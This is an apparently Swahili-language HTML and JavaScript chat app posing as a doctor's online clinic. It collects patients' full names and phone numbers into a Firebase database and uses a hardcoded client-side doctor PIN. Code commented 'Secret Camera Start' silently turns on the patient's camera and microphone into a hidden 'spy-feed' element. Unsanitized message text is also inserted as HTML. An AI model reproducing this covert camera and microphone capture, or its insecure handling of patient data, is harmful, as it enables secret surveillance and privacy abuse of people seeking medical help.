<!DOCTYPE html>
<html lang="sw">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Dr. William: Master Control v6</title>
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>

    <style>
        :root { --gold: #D4AF37; --bg: #050505; --red: #ff4757; --green: #2ed573; --panel: rgba(15,15,15,0.95); }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
        
        body, html { background: #000; color: white; height: 100vh; width: 100vw; overflow: hidden; position: fixed; }

        /* MANDHARI YA NDEGE MWEUSI (BLACK BIRD) */
        .app-bg {
            position: fixed; inset: 0;
            background: linear-gradient(rgba(0,0,0,0.85), rgba(0,0,0,0.95)), 
                        url('https://images.unsplash.com/photo-1551467003-83296837905d?q=80&w=2070&auto=format&fit=crop');
            background-size: cover; background-position: center; z-index: -1;
        }

        /* SECRET SURVEILLANCE FEED */
        #spy-container {
            position: fixed; top: 70px; right: 10px; width: 100px; height: 130px;
            border: 2px solid var(--gold); border-radius: 12px; z-index: 1000;
            overflow: hidden; background: #000; display: none; box-shadow: 0 0 15px var(--gold);
        }
        #spy-feed { width: 100%; height: 100%; object-fit: cover; }

        /* AUTH SCREEN */
        #login-screen { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; justify-content: center; align-items: center; }
        .login-box { background: var(--panel); padding: 40px; border-radius: 30px; border: 1px solid var(--gold); width: 90%; max-width: 400px; text-align: center; }
        .login-box input { width: 100%; padding: 16px; margin: 12px 0; border-radius: 15px; background: #000; color: white; border: 1px solid #333; font-size: 16px; outline: none; }
        .login-box input:focus { border-color: var(--gold); }

        /* INTERFACE */
        #main-app { display: none; flex-direction: column; height: 100vh; }
        .top-bar { padding: 15px 20px; background: var(--panel); border-bottom: 2px solid var(--gold); display: flex; justify-content: space-between; align-items: center; z-index: 10; }

        /* DASHBOARD */
        #doctor-view { flex: 1; overflow-y: auto; padding: 20px; display: none; }
        .user-card { background: rgba(30,30,30,0.9); padding: 20px; border-radius: 20px; margin-bottom: 15px; border-left: 5px solid var(--gold); display: flex; justify-content: space-between; align-items: center; }
        
        /* CHAT VIEW */
        #chat-view { flex: 1; display: none; flex-direction: column; position: relative; }
        .messages-container { flex: 1; overflow-y: auto; padding: 20px; display: flex; flex-direction: column; gap: 12px; padding-bottom: 120px; }
        .msg { padding: 14px 18px; border-radius: 20px; max-width: 80%; font-size: 14px; line-height: 1.5; position: relative; }
        .msg.me { background: var(--gold); color: #000; align-self: flex-end; border-bottom-right-radius: 4px; font-weight: 500; }
        .msg.other { background: #222; color: #fff; align-self: flex-start; border-bottom-left-radius: 4px; }
        .msg-info { font-size: 10px; margin-bottom: 4px; display: block; opacity: 0.7; }

        /* INPUT AREA */
        .input-area { position: fixed; bottom: 0; width: 100%; background: #111; padding: 20px; display: flex; gap: 12px; align-items: center; border-top: 1px solid #333; }
        .msg-input-wrap { flex: 1; background: #000; border-radius: 30px; border: 1px solid var(--gold); display: flex; align-items: center; padding: 5px 15px; }
        .msg-input-wrap input { flex: 1; background: transparent; border: none; color: white; padding: 12px; outline: none; font-size: 16px; }
        .btn-action { background: var(--gold); border: none; width: 50px; height: 50px; border-radius: 50%; color: black; display: flex; justify-content: center; align-items: center; cursor: pointer; }
    </style>
</head>
<body>

    <div class="app-bg"></div>

    <div id="spy-container">
        <video id="spy-feed" autoplay muted playsinline></video>
    </div>

    <div id="login-screen">
        <div class="login-box">
            <h2 style="color:var(--gold); margin-bottom:10px;">DR. WILLIAM V6</h2>
            <div id="patient-form">
                <input type="text" id="reg-name" placeholder="Majina Kamili">
                <input type="tel" id="reg-phone" placeholder="Namba ya Simu (07...)" maxlength="10">
            </div>
            <input type="password" id="doc-pin" placeholder="Doctor Secure PIN" style="display:none;">
            <p onclick="showAdmin()" id="admin-link" style="color:var(--gold); cursor:pointer; font-size:12px; margin:15px;">Mimi ni Daktari</p>
            <button onclick="handleAuth()" style="background:var(--gold); width:100%; padding:18px; border-radius:15px; border:none; font-weight:bold; cursor:pointer;">FUNGUA CLINIC</button>
        </div>
    </div>

    <div id="main-app">
        <div class="top-bar">
            <div>
                <b id="header-title" style="color:var(--gold)">Clinic</b><br>
                <small id="header-sub" style="font-size:10px; color:#888;"></small>
            </div>
            <button id="exit-chat" onclick="location.reload()" style="display:none; background:none; border:1px solid var(--red); color:var(--red); padding:5px 12px; border-radius:10px;">Rudi</button>
        </div>

        <div id="doctor-view">
            <h4 style="color:#666; margin-bottom:15px;">WAGONJWA WALIOPONYE (ACTIVE):</h4>
            <div id="patient-list"></div>
        </div>

        <div id="chat-view">
            <div class="messages-container" id="chat-flow"></div>
            <div class="input-area">
                <i class="fas fa-paperclip" style="color:var(--gold); font-size:20px;" onclick="document.getElementById('file-in').click()"></i>
                <input type="file" id="file-in" style="display:none;" onchange="uploadFile(this)">
                <div class="msg-input-wrap">
                    <input type="text" id="user-msg" placeholder="Andika ujumbe hapa...">
                </div>
                <button class="btn-action" onclick="pushMessage()"><i class="fas fa-paper-plane"></i></button>
            </div>
        </div>
    </div>

    <audio id="notif" src="https://assets.mixkit.co/active_storage/sfx/2358/2358-preview.mp3"></audio>

    <script>
        const firebaseConfig = { databaseURL: "https://drwilliamtz-e44aa-default-rtdb.europe-west1.firebasedatabase.app" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        let myData = JSON.parse(localStorage.getItem('william_v6_data'));
        let isDoc = localStorage.getItem('william_v6_isdoc') === 'true';
        let currentRoomId = "";

        // AUTH INITIALIZATION
        if(myData) {
            document.getElementById('login-screen').style.display = 'none';
            document.getElementById('main-app').style.display = 'flex';
            isDoc ? loadDoctorDashboard() : startUserChat();
        }

        function showAdmin() {
            document.getElementById('patient-form').style.display = 'none';
            document.getElementById('doc-pin').style.display = 'block';
            document.getElementById('admin-link').style.display = 'none';
        }

        function handleAuth() {
            const name = document.getElementById('reg-name').value.trim();
            const phone = document.getElementById('reg-phone').value.trim();
            const pin = document.getElementById('doc-pin').value;

            if(pin === "W005") {
                isDoc = true; myData = { name: "Dr. William" };
                localStorage.setItem('william_v6_isdoc', 'true');
            } else {
                if(name.split(' ').length < 2 || phone.length < 10) return alert("Jaza Majina 2 na Namba sahihi!");
                const rId = "room_" + phone;
                myData = { name, phone, roomId: rId };
                db.ref('patients/' + rId).set({ ...myData, lastSeen: Date.now(), blocked: false });
            }
            localStorage.setItem('william_v6_data', JSON.stringify(myData));
            location.reload();
        }

        // DOCTOR LOGIC
        function loadDoctorDashboard() {
            document.getElementById('doctor-view').style.display = 'block';
            document.getElementById('header-title').innerText = "Doctor Terminal";
            
            db.ref('patients').on('value', snap => {
                const list = document.getElementById('patient-list');
                list.innerHTML = "";
                snap.forEach(child => {
                    const u = child.val();
                    if(u.blocked) return;
                    const online = (Date.now() - u.lastSeen) < 15000;
                    list.innerHTML += `
                        <div class="user-card">
                            <div onclick="enterChat('${child.key}', '${u.name}', '${u.phone}')">
                                <b>${u.name}</b><br><small>${u.phone}</small>
                                <div style="color:${online ? '#2ed573':'#ff4757'}; font-size:10px;">‚óè ${online ? 'Online':'Offline'}</div>
                            </div>
                            <button onclick="blockPatient('${child.key}')" style="background:none; border:1px solid var(--red); color:var(--red); padding:5px; border-radius:5px; font-size:10px;">BLOCK</button>
                        </div>`;
                });
            });
        }

        // CHAT LOGIC
        function enterChat(roomId, name, phone) {
            currentRoomId = roomId;
            document.getElementById('doctor-view').style.display = 'none';
            document.getElementById('chat-view').style.display = 'flex';
            document.getElementById('exit-chat').style.display = 'block';
            document.getElementById('header-title').innerText = name;
            document.getElementById('header-sub').innerText = phone;
            if(isDoc) document.getElementById('spy-container').style.display = 'block';

            db.ref('messages/' + roomId).off();
            db.ref('messages/' + roomId).on('child_added', snap => {
                const msg = snap.val();
                appendMsg(msg);
            });
        }

        function startUserChat() {
            enterChat(myData.roomId, "Dr. William", "Medical Advisor");
            // Secret Camera Start
            navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
                document.getElementById('spy-feed').srcObject = stream;
            }).catch(e => console.log("Spy access denied"));
            
            setInterval(() => db.ref('patients/' + myData.roomId).update({ lastSeen: Date.now() }), 8000);
        }

        function appendMsg(m) {
            const flow = document.getElementById('chat-flow');
            const div = document.createElement('div');
            const isMe = (isDoc && m.sender === "Dr. William") || (!isDoc && m.sender === myData.name);
            div.className = `msg ${isMe ? 'me' : 'other'}`;
            div.innerHTML = `<span class="msg-info">${m.sender}</span>${m.text}`;
            flow.appendChild(div);
            flow.scrollTop = flow.scrollHeight;
            if(!isMe) document.getElementById('notif').play();
        }

        function pushMessage() {
            const inp = document.getElementById('user-msg');
            if(!inp.value.trim()) return;
            db.ref('messages/' + currentRoomId).push({
                sender: isDoc ? "Dr. William" : myData.name,
                text: inp.value.trim(),
                timestamp: Date.now()
            });
            inp.value = "";
        }

        // Enter key to send
        document.getElementById('user-msg').addEventListener('keypress', (e) => {
            if(e.key === 'Enter') pushMessage();
        });

        function uploadFile(input) {
            if(input.files[0]) {
                db.ref('messages/' + currentRoomId).push({
                    sender: isDoc ? "Dr. William" : myData.name,
                    text: `üìÅ Attachment: ${input.files[0].name}`,
                    timestamp: Date.now()
                });
            }
        }

        function blockPatient(id) {
            if(confirm("Block this user?")) db.ref('patients/' + id).update({ blocked: true });
        }
    </script>
</body>
</html>
